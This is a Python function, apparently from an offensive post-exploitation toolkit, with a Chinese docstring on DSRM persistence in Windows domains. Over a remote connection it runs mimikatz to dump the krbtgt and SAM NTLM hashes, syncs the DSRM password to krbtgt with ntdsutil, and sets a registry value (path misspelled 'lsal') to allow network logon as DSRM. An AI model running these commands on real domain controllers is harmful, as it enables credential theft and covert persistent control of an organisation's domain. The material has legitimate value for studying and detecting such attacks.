import struct

"""
   DSRM( Directory Services Restore Mode，目录服务恢复模式)是 Windows 域环境中域控制器的安全模式启动选项。每
个域控制器都有一个本地管理员账户(也就是 DSRM 账户)。DSRM的用途是:允许管理员在域环境中出现故障或崩溃时还原、修复、重
建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM 的密码需要在安装 DC 时设置，且很少会被重置。修改DSRM
密码最基本的方法是在DC上运行ntdsutil命令行工具。
   在渗透测试中，可以使用 DSRM 账号对域环境进行持久化操作。如果域控制器的系统版本为Windows Server 2008，需要安装 KB961320
才可以使用指定域账号的密码对 DSRM的密码进行同步。在 Windows Server 2008 以后版本的系统中不需要安装此补丁。如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。
   我们知道，每个域控制器都有本地管理员账号和密码(与域管理员账号和密码不同)。DSRM 账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。
"""


def DSRM(conn):
    # 获取krbtgt 的NTLM Hash
    print('\033[1;34;34m' + "[*] Obtain krbtgt's NTLM Hash." + '\033[0m')
    command1 = "mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch /name: krbtgt\" exit > 1.txt && type 1.txt && DEL 1.txt && exit"
    conn.sendall(command1.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    # 使用mimikatz 查看并读取SAM文件中本地管理员的NTLM Hash
    print('\033[1;34;34m' + "[*] View and read the NTLM hash of the local administrator in the SAM file." + '\033[0m')
    command2 = "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit > 1.txt && type 1.txt && DEL 1.txt && exit"
    conn.sendall(command2.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    # 将DSRM 账号和krbtgt 的 NTLM Hash 同步
    print('\033[1;34;34m' + "[*] Synchronize DSRM account with krbtgt's NTLM hash." + '\033[0m')
    command3 = "NTDSUTIL \"SET DSRM PASSWORD\" \"SYNC FROM DOMAIN account krbtgt\" \"q\" \"q\""
    conn.sendall(command3.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    # 如果要使用DSRM账号通过网络登录域控制器，需要将该值设置为2
    print('\033[1;34;34m' + "[*] Under any circumstances, the DSRM administrator account can be used to log in to the domain controller." + '\033[0m')
    command4 = "reg add hklm\\system\\currentcontrolset\\control\\lsal /v dsrmadminlogonbehavior /t REG_DWORD /d 2 /f > 1.txt && type 1.txt && DEL 1.txt && exit"
    conn.sendall(command4.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    print('\033[1;34;34m' + "[*] You can now attempt to remotely log in to the domain controller through the network using a DSRM account." + '\033[0m')
